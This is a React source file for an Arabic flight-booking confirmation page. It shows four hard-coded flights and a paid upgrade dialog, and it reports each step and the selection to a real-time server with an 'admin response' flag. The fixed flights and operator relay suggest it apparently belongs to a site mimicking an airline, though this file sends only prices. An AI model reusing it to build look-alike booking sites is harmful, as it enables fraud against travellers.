import GridPattern from "@/components/ui/animated-grid-pattern";
import ShinyButton from "@/components/ui/shiny-button";
import destinations from "@/data/destinations";
import { cn } from "@/lib/utils";
import { PlaneTakeoffIcon } from "lucide-react";
import { FC, useEffect, useState } from "react";
import { BsAirplaneFill } from "react-icons/bs";
import { Link, useLocation, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogClose,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";

const flymax = [
  {
    title: "حقيبة صغيرة تحت المقعد",
    desc: "40x20x30 سم",
    icon: "/assets/images/flymax/small-bag.svg",
  },
  {
    title: "حقيبة مقصورة مع أسبقيّة صعود الطائرة",
    desc: "10 كغ ، 40x20x55 سم و أسبقية الصعود إلى الطائرة",
    icon: "/assets/images/flymax/carry-bag.svg",
  },
  {
    title: "اختيار المقعد المميّز",
    desc: "الصفوف 1 إلى 4",
    icon: "/assets/images/flymax/select-seat.svg",
  },
  {
    title: "حقيبة شحن بوزن 40 كغ",
    desc: "(15 كغ 1x ) +(25 كغ 1x )",
    icon: "/assets/images/flymax/big-bag.svg",
  },
  {
    title: "إنهاء اجراءات السفر أونلاين 10 أيام قبل الرحلة",
    icon: "/assets/images/flymax/checkin-fast.svg",
  },
  {
    title: "إنهاء اجراءات السفر في المطار مجّاناً",
    icon: "/assets/images/flymax/airport-checkin.svg",
  },
  {
    title: "تعديل غير محدود للرحلة",
    icon: "/assets/images/flymax/edit-bag.svg",
  },
  {
    title: "إلغاء الحجز مجّاناً",
    desc: "إعادة المبلغ كرصيد",
    icon: "/assets/images/flymax/cash-back.svg",
  },
  {
    title: "وجبة مجاناً",
    desc: "وجبة خفيفة ومشروب",
    icon: "/assets/images/flymax/meal-free.svg",
  },
];

const TripConfirmPage = () => {
  useEffect(() => {
    setCurrentPage("تأكيد الرحلة");
  }, []);

  const { state } = useLocation();
  const fromCode = destinations?.filter((d) => d.name === state?.from)[0].code;
  const toCode = destinations?.filter((d) => d.name === state?.to)[0].code;

  return (
    <section className="container relative flex flex-col pb-10">
      <Link
        to={"/"}
        className="bg-main text-white rounded-full mt-6 lg:mt-20 mx-auto font-semibold px-12 py-3 z-10"
      >
        تعديل البحث
      </Link>
      <h2 className="text-gray-400 lg:text-3xl font-bold mt-3">المغادرة</h2>
      <div className="flex gap-x-2 items-end mt-3 mb-6 lg:mb-8">
        <PlaneTakeoffIcon className="size-6 inline-block -scale-x-100" />
        <p className="text-main lg:text-3xl font-bold">
          ({fromCode}) {state.from} إلي ({toCode}) {state.to}
        </p>
      </div>
      <div className="mb-10 relative flex h-full w-full flex-wrap items-center justify-center gap-y-5 gap-x-[5dvw] z-10">
        <TravelCard
          tripCode={"F3 152"}
          tripTime={"1:35:00"}
          from={{ name: state.from, code: fromCode, time: "01:15", room: "1" }}
          to={{ name: state.to, code: toCode, time: "02:50", room: "1" }}
          price={159}
        />
        <TravelCard
          tripCode={"F3 156"}
          tripTime={"1:35:00"}
          from={{ name: state.from, code: fromCode, time: "07:35", room: "1" }}
          to={{ name: state.to, code: toCode, time: "09:10", room: "1" }}
          price={189}
        />
        <TravelCard
          tripCode={"F3 157"}
          tripTime={"1:35:00"}
          from={{ name: state.from, code: fromCode, time: "13:10", room: "1" }}
          to={{ name: state.to, code: toCode, time: "14:45", room: "1" }}
          price={209}
        />
        <TravelCard
          tripCode={"F3 163"}
          tripTime={"1:35:00"}
          from={{ name: state.from, code: fromCode, time: "18:25", room: "1" }}
          to={{ name: state.to, code: toCode, time: "20:00", room: "1" }}
          price={194}
        />
      </div>

      <GridPattern
        numSquares={30}
        maxOpacity={0.5}
        duration={3}
        repeatDelay={1}
        className={cn(
          "[mask-image:radial-gradient(300px_circle_at_center,white,transparent)]",
          "inset-x-0 inset-y-[-15%] skew-y-12"
        )}
      />
    </section>
  );
};
export default TripConfirmPage;

interface TravelCardProps {
  from: {
    name: string;
    code: string;
    time: string;
    room: string;
  };
  to: {
    name: string;
    code: string;
    time: string;
    room: string;
  };
  tripCode: string;
  tripTime: string;
  price: number;
}

const TravelCard: FC<TravelCardProps> = ({
  from,
  to,
  tripCode,
  tripTime,
  price,
}) => {
  const { state } = useLocation();
  const [isFlymax, setIsFlymax] = useState(false);
  const navigate = useNavigate();

  const calculateTotal = (price: number) => {
    let total = state.activeTab === 0 ? price * 2 : price;
    total = (state.adult + state.child + state.baby) * total;

    if (isFlymax) total += 200;

    return total.toFixed(2).replace(/\.?0+$/, "");
  };

  const handleSubmit = (e: any) => {
    e.preventDefault();
    const { price, total, upgrade } = Object.fromEntries(
      new FormData(e.target)
    );

    if (price) {
      // navigate("/traveller-info", {
      //   state: { ...state, price, total, ترقية: upgrade },
      // });

      sendDataToServer({
        current: "تأكيد الرحلة",
        data: { السعر: price, "التكلفة الكلية": total, ترقية: upgrade },
        nextPage: "traveller-info",
        waitingForAdminResponse: false,
        navigate,
        state: {
          ...state,
          total,
        },
      });
    }
  };

  return (
    <div
      className={`group relative bg-white/85 shadow-lg flex h-auto w-[clamp(15rem,90dvw,28rem)] flex-col items-start justify-center overflow-hidden rounded-2xl border border-neutral-100 cursor-pointer`}
    >
      <div className="absolute right-0 top-0 h-24 w-24 rounded-2xl bg-gradient-to-r from-alt  to-alt opacity-20 blur-3xl"></div>

      <div className="flex w-full">
        <div className="px-2 py-5 lg:px-5 basis-3/4 flex gap-2 justify-between">
          <div className="basis-1/4 flex flex-col gap-y-1 font-bold py-2">
            <p className="text-main capitalize text-center">{from.time}</p>
            <p className="text-gray-500 text-lg capitalize text-center">
              ({from.code})
            </p>
            <p className="text-gray-500 text-lg capitalize text-center">
              {from.name}
            </p>
            <p className="text-main capitalize text-center">
              الصالة {from.room}
            </p>
          </div>
          <div className="basis-1/2 flex flex-col gap-y-1 justify-between">
            <div>
              <p className="text-main capitalize text-center text-sm font-semibold">
                {tripCode}
              </p>
              <div className="relative mt-4 w-full">
                <div className="p-1.5 bg-white rounded-full size-fit absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 transition-transform duration-1000 ease-out group-hover:translate-x-[-3rem] sm:group-hover:translate-x-[-3.3rem]">
                  <BsAirplaneFill className="text-alt h-4 w-4 -rotate-90" />
                </div>
                <div className="size-1.5 rounded-full bg-alt absolute left-0 top-1/2 -translate-y-1/2 transition-all delay-500 duration-150 group-hover:scale-150 group-hover:bg-main" />
                <div className="w-full h-0.5 bg-alt" />
                <div className="size-1.5 rounded-full bg-alt absolute right-0 top-1/2 -translate-y-1/2" />
              </div>
            </div>

            <p className="text-main capitalize text-center">
              {tripTime.split(":")[0]} ساعات {tripTime.split(":")[1]} دقيقة
            </p>
          </div>

          <div className="basis-1/4 flex flex-col gap-y-1 font-bold py-2">
            <p className="text-main capitalize text-center">{to.time}</p>
            <p className="text-gray-500 text-lg capitalize text-center">
              ({to.code})
            </p>
            <p className="text-gray-500 text-lg capitalize text-center">
              {to.name}
            </p>
            <p className="text-main capitalize text-center">الصالة {to.room}</p>
          </div>
        </div>
        <form
          onSubmit={handleSubmit}
          className="px-2 py-5 lg:px-5 basis-1/4 border-r border-main-foreground border-dotted flex flex-col justify-between gap-4"
        >
          <p className="text-main capitalize text-center text-sm">
            سعر التذكرة:
            <br />
            <strong className="text-base">{price} SAR</strong>
          </p>
          <p className="text-main capitalize text-center text-sm">
            التكلفة الكلية:
            <br />
            <strong className="text-base">{calculateTotal(price)} SAR</strong>
          </p>
          <input type="hidden" name="price" value={price} />
          <input type="hidden" name="total" value={calculateTotal(price)} />
          <input
            className="hidden"
            type="radio"
            name="upgrade"
            checked={isFlymax}
          />
          <ShinyButton
            text="اختيار"
            className="w-full bg-alt rounded-3xl tracking-tight font-bold py-2"
            type={"submit"}
          />
        </form>
      </div>

      <div className="p-4 border-t w-full grid place-items-center">
        <Dialog>
          <DialogTrigger asChild>
            <Button className="w-fit bg-main hover:bg-main/85 text-white rounded-full mx-auto font-semibold text-sm sm:text-base sm:px-12 py-3 z-10">
              هل تريد ترقية الرحلة إلى فلاب ماكس
            </Button>
          </DialogTrigger>
          <DialogContent className="max-w-[90dvw] sm:max-w-[425px] p-0 border-none rounded-xl">
            <DialogHeader>
              <DialogTitle className="flex justify-between items-center bg-main text-white p-4">
                <div className="flex flex-col gap-1">
                  <p>فلاي ماكس</p>
                  <p className="text-sm text-start">سافر بمرونة</p>
                </div>
                <p>SAR 200.00 +</p>
              </DialogTitle>
            </DialogHeader>
            <div className="h-[50dvh] overflow-y-scroll flex flex-col gap-4 px-4 border-b sm:border-b-0">
              {flymax.map((fly) => (
                <div key={fly.title} className="flex items-center gap-4">
                  <img className="size-12" src={fly.icon} alt="bag icon" />
                  <div className="flex flex-col">
                    <p className="text-main font-bold">{fly.title}</p>
                    {fly.desc && (
                      <p className="text-main text-sm font-semibold">
                        {fly.desc}
                      </p>
                    )}
                  </div>
                </div>
              ))}
            </div>
            <div className="flex items-center justify-center">
              <DialogClose disabled={isFlymax}>
                <Button
                  type="button"
                  className="w-fit bg-main hover:bg-main/85 text-white rounded-full sm:mt-6 mx-auto font-semibold px-12 mb-4 py-3"
                  onClick={() => setIsFlymax(true)}
                  disabled={isFlymax}
                >
                  اختيار
                </Button>
              </DialogClose>
              <DialogClose disabled={!isFlymax}>
                <Button
                  type="button"
                  className="ms-4 w-fit bg-primary text-white rounded-full sm:mt-6 mx-auto font-semibold px-12 mb-4 py-3"
                  onClick={() => setIsFlymax(false)}
                  disabled={!isFlymax}
                >
                  إزالة
                </Button>
              </DialogClose>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
};
